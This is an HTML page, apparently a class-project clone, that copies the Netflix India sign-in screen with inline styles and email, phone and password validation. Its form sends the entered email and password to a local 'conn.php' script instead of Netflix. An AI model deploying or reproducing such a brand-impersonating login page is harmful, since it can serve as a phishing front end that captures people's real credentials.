
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
    <link rel="stylesheet" href="style/style.css">
    <link rel="icon" href="img/logo.png">
    <title>Netflix India - Watch TV Shows Online, Watch Movies Online<</title>
<style>
    body{
    margin: 0;
    padding: 0;
    background: url("img/background.jpg") no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
    font-family: 'Helvetica Neue',Helvetica,Arial,sans-serif;
}

.img-logo{
    height: 94px;
    margin-left: 45px;
}

.upper{
    background-color: rgba(0, 0, 0, 0.6);
    padding-bottom: 100px;
}

.bottom{
    background-color: rgba(0, 0, 0, 0.85);
    color: #757575;
    
}

.bottom-width{
    max-width: 1000px;
    margin: 0 auto;
    padding: 30px;
}

.bottom-flex{
    display: flex;
    flex-wrap: wrap;
    padding: 15px 0 0 0;
    margin-block-start: 0;
    margin-block-end: 0;
}

.bottom-flex li{
    list-style: none;
}

.list-bottom{
    width: 25%;
    margin-top: 10px;
}

.link-bottom{
    text-decoration: none;
    color: #757575;
    font-size: 0.8rem;
}

.link-bottom:hover{
    text-decoration: underline;
    
}

.login{
    margin: 0 auto;
    width: 310px;
    background-color: rgba(0, 0, 0, 0.6);
    border-radius: 5px;
    padding: 30px 70px 143px 70px;
}

.login h1{
    color: white;
    padding-bottom: 10px;
}

.input-text{
    margin-bottom: 20px;
}

.input-text input{
    width: 100%;
    height: 45px;
    background-color: #333;
    color: white;
    border-radius:5px;
    border: none;
    outline: transparent;
    text-indent: 18px;
}

.input-text input::-webkit-input-placeholder {
    font-size: 1rem;
    color: #999;
}

.input-text input::-moz-placeholder {
    font-size: 1rem;
    color: #999;
    text-indent: 40px;
}

.signin-button{
    margin-top: 20px;
    width: 100%;
    padding: 13px;
    border-radius: 5px;
    background-color: red;
    color:white;
    border:none;
    font-weight: bold;
    font-size: 1.05rem;
    cursor: pointer;
}

.remember-flex{
    display: flex;
    justify-content: space-between;
    margin-top: 10px;
    font-size: 0.8rem;
}

.color_text{
    color: #b3b3b3;
}

.color_link{
    color: #737373;
}

.signup-link{
    color: white;
    text-decoration: none;
}

.warning-input{
    display: none;
    color:#e87c03;
    margin-top: 0;
    font-size: 0.8rem;
    margin-top: 6px;
}

.signup-link:hover{
    text-decoration: underline;
}

.face_icon{
    color: #3b5998;
    margin-right: 6px;
    font-size: 20px;
}

.log_face{
    text-decoration: none;
    margin-left: 10px;
    font-size: 0.8rem;
}

.login-face{
    margin: 50px 0 15px 0;
    vertical-align: middle;
    color: #8c8c8c;
}

.new-members{
    margin-bottom: 10px;
    color: #8c8c8c;
}

.help a{
    text-decoration: none;
}
.help a:hover{
    text-decoration: underline;
}

.protection{
    font-size: 0.8rem;
    color: #8c8c8c;
}

.protection a{
    text-decoration: none;
}

.protection a:hover{
    text-decoration: underline;
}

.tel-link{
    text-decoration: none;
    color: #757575;
}

.tel-link:hover{
    text-decoration: underline;
}


@media screen and (max-width: 740px){
    body{
        background: black;
    }

    .img-logo {
        margin-left: 22px;
    }

    .login{
        padding: 0 10px 0 10px;
        width: 100%;
    }

    .login-div{
        width: 90%;
        margin: 0 auto;
    }

    .bottom {
        border-top: 1px solid #737373;
    }

    .upper{
        padding-bottom: 93px;
    }

    .list-bottom{
        width: 33%;
    }
}

@media screen and (max-width: 500px){
    .list-bottom{
        width: 50%;
    }
}</style>
</head>

<body>
    <div class="upper">
        <div class="logo">
            <a href="D:\New folder\htdocs\phpclassfiles\indexeng.php">
                <img src="img/Netflix-Logo.png" class="img-logo"/>
            </a>
        </div>
    
        <div class="login-div">
            <form class="login" action="conn.php" method="post">
                <h1>Sign In</h1>
                <div class="input-text">
                    <input type="text" id="inputEmail" name="email" placeholder="Email or phone number" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                    <div class="warning-input" id="warningEmail">
                        Please enter a valid email or phone number.
                    </div>
                </div>
                
                <div class="input-text">
                    <input type="password" id="inputPassword" name="password" placeholder="Password" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                    <div class="warning-input" id="warningPassword">
                        Your password must contain between 4 and 60 characters.
                    </div>
                </div>
                
                <div>
                    <button class="signin-button">Sign In</button>
                </div>
                <div class="remember-flex">
                    <div>
                        <input type="checkbox">
                        <label class="color_text">Remember me</label>
                    </div>
                    <div class="help">
                        <a class="color_text" href="#">Need help?</a>
                    </div>
                </div>
                <div class="login-face">
                    <img src="img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Login with Facebook</a>
                </div>
                <div class="new-members">
                    New to Netflix? <a href="#" class="signup-link">Sign up now</a>.
                </div>
                <div class="protection color_link help">
                    This page is protected by Google reCAPTCHA to ensure you"re not a bot. <a href="#">Learn more.</a>
                </div>
            </form>
        </div>
    </div>
    <div class="bottom">
        <div class="bottom-width">
            Questions? Call <a href="tel:1-844-542-4813" class="tel-link">1-844-542-4813</a>
            <div>
                <ul class="bottom-flex">
                    <li class="list-bottom">
                        <a href="indexeng.php" target="" class="link-bottom">
                            FAQ
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Help Center
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Terms of Use
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Privacy
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Cookie Preferences
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Corporate information
                        </a>
                    </li>
                </ul>
            </div>
            
        </div>
    </div>
    <script src="js/script.js"></script>
</body>
<script>let inputTouched = {
    email: false,
    password: false
}

const inputEmail = document.getElementById("inputEmail")
const inputPassword = document.getElementById("inputPassword")
const inputWrapperEmail = document.getElementById("input-wrapper-email")
const inputWrapperPassword = document.getElementById("input-wrapper-password")
const warningEmail = document.getElementById("warningEmail")
const warningPassword = document.getElementById("warningPassword")

const inputOnBlur = (ev) =>{
    if(inputTouched.email){
        if(!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value)){
            warningEmail.style.display="block"
            inputEmail.style.borderBottom="2px solid #e87c03"
        }
        else{
            warningEmail.style.display="none"
            inputEmail.style.borderBottom="none"
        }
    }
    if(inputTouched.password){
        if(!(inputPassword.value.length >= 4 && inputPassword.value.length <= 60)){
            warningPassword.style.display="block"
            inputPassword.style.borderBottom="2px solid #e87c03"
        }
        else{
            warningPassword.style.display="none"
            inputPassword.style.borderBottom="none"
        }
    }
}

const inputOnFocus = (ev) =>{
    inputTouched[ev.name] = true;
}

const validateEmail = email => {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

const validatePhone = email => {
    const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/im;
    return re.test(String(email).toLowerCase());
}</script>
</html>


